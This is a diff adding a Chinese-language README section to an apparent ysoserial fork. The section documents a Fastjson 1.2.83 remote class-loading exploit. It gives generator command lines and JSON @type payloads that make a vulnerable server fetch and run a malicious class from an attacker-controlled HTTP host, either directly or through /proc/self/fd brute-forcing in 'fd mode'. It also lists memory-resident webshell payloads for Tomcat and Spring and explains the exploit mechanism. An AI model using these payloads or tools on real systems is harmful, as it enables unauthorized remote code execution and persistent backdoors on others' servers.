@@ -202,6 +202,103 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 
 这里就不一一测试截图了，欢迎大家进行测试，如果问题请按文档最后的联系方式联系我。
 
+## Fastjson 1.2.83 getResourceAsStream 利用链
+
+Fastjson 1.2.83 的 `checkAutoType` 中 `typeName.replace('.', '/') + ".class"` 路径可以触发 `getResourceAsStream()` 远程加载类。本项目支持基于此漏洞一键生成带 `@JSONType(asm=false)` 注解的恶意 class 文件，适用于 `http:` 协议直连和 `/proc/self/fd/N` 爆破两种模式。
+
+### 用法
+
+```shell
+# jdk8-http 模式（默认）：生成单个 .class 文件
+java -jar ysuserial-<version>-su18-all.jar \
+  -g Fastjson1 \
+  -p 'EX-TomcatEcho' \
+  -f83 <LHOST>:<LPORT>:<ClassName> \
+  -f /path/to/www/ClassName.class
+
+# fd 模式：生成 probe.jar（含 254 个类），适用于现代 fat-jar 场景
+java -jar ysuserial-<version>-su18-all.jar \
+  -g Fastjson1 \
+  -p 'EX-MS-TFMSFromThread-cmd' \
+  -f83 <LHOST>:<LPORT>:<ProbeName> \
+  --fastjson-mode fd \
+  --fastjson-tag mytag \
+  --fastjson-www-dir /path/to/www
+```
+
+### 新增参数
+
+| 参数 | 说明 |
+|------|------|
+| `-f83, --fastjson-83` | Fastjson 1.2.83 模式，格式：`LHOST:LPORT[:ClassName]` |
+| `--fastjson-mode` | 模式选择：`jdk8-http`（默认）或 `fd` |
+| `--fastjson-tag` | 类名/Jar名标签，仅允许字母数字下划线 |
+| `--fastjson-max-fd` | fd 模式最大探测 fd 数，默认 256 |
+| `--fastjson-www-dir` | probe.jar 输出目录 |
+
+### 生成产物
+
+**jdk8-http 模式**输出一个 .class 文件，放到 HTTP 服务器 web 目录下。JSON payload 格式：
+
+```json
+{"@type":"http:..<INT_IP>:<LPORT>.<ClassName>"}
+```
+
+**fd 模式**输出 `probe_<tag>.jar` 和 `probe_<tag>`（复制到 www 目录）。JSON payload 为数组：
+
+```json
+[
+  {"@type":"jar:http:..<INT_IP>:<LPORT>.probe_<tag>!.foo.T<tag>Exception"},
+  {"@type":"jar:file:.proc.self.fd.3!.fd3.T<tag>Exception"},
+  ...
+  {"@type":"jar:file:.proc.self.fd.256!.fd256.T<tag>Exception"}
+]
+```
+
+### 可用的 Payload 命令
+
+与标准 TemplatesImpl 路径完全一致，支持所有 `EX-` 开头的命令：
+
+```shell
+# Echo 回显
+EX-AllEcho
+EX-TomcatEcho
+EX-SpringEcho
+
+# 内存马（仅支持 cmd 类型，bx/gz/suo5 受 Javassist/JDK 兼容性限制）
+EX-MS-TFMSFromThread-cmd     # Tomcat Filter
+EX-MS-TSMSFromThread-cmd     # Tomcat Servlet
+EX-MS-TLMSFromThread-cmd     # Tomcat Listener
+EX-MS-SpringControllerMS-cmd     # Spring Controller
+EX-MS-SpringInterceptorMS-cmd    # Spring Interceptor
+```
+
+### 示例
+
+```shell
+# 生成 TomcatEcho 回显 class（jdk8-http）
+java -jar ysuserial-<version>-su18-all.jar \
+  -g Fastjson1 -p 'EX-TomcatEcho' \
+  -f83 192.168.1.100:19090:TomcatEcho \
+  -f ./www/TomcatEcho.class
+
+# 生成 SpringController 内存马 class（fd 模式）
+java -jar ysuserial-<version>-su18-all.jar \
+  -g Fastjson1 -p 'EX-MS-SpringControllerMS-cmd' \
+  -f83 192.168.1.100:19090:p \
+  --fastjson-mode fd --fastjson-tag test1 --fastjson-www-dir ./www
+```
+
+### 原理
+
+Fastjson 处理 `@type` 时调用 `checkAutoType(typeName)`，其中：
+1. `typeName.replace('.', '/')` 将 `http:..INT_IP:PORT.ClassName` 转换为 `http://INT_IP:PORT/ClassName`
+2. 追加 `.class` 后调用 `getResourceAsStream("http://INT_IP:PORT/ClassName.class")` 远程获取类字节码
+3. 类中 `@JSONType(asm=false)` 注解使 Fastjson 通过 JSONType 路径反序列化
+4. 类的 `<clinit>` 或构造方法中嵌入的回显/内存马逻辑自动执行
+
+fd 模式额外利用 `jar:http://` 协议先通过 `LaunchedURLClassLoader` 加载 probe.jar，Java 打开 jar 后分配文件描述符 `/proc/self/fd/N`，再通过 `jar:file:` 协议逐 fd 爆破触发。
+
 ## 针对 ChainedTransformer
 
 本项目为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：
